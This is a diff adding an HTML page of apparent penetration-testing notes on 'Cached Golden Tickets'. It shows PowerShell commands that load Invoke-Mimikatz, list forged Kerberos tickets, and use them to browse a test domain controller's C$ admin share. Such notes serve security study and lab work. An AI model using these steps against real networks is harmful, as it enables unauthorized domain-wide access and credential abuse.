@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Cached Golden Tickets</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Cached Golden Tickets</h1><br/><strong>Cached Kerberos Tickets</strong><br />With the usual command klist sometime is not possible to see the tickets created with mimikatz<br /><div class="codebox"><div class="codebox">PS&gt;&nbsp;.&nbsp;.\Invoke-Mimikatz.ps1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#load&nbsp;mimikatz<br />PS&gt;&nbsp;Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::list&quot;&#39;</div></div><br />    <a href=""><img src="images/1145-1.png" alt="images/1145-1.png" /></a><br />This mean that we can access to any service in the Domain.<br /><br />If we want access to the Domain Controller now we can.<br /><a href=""><img src="images/1145-2.png" alt="images/1145-2.png" /></a><br /><div class="codebox"><div class="codebox">PS&gt;&nbsp;ls&nbsp;\\testdc.daniele.local\c$</div></div><br />    <a href=""><img src="images/1145-3.png" alt="images/1145-3.png" /></a><br /><br /></div>
+</body>
+</html>
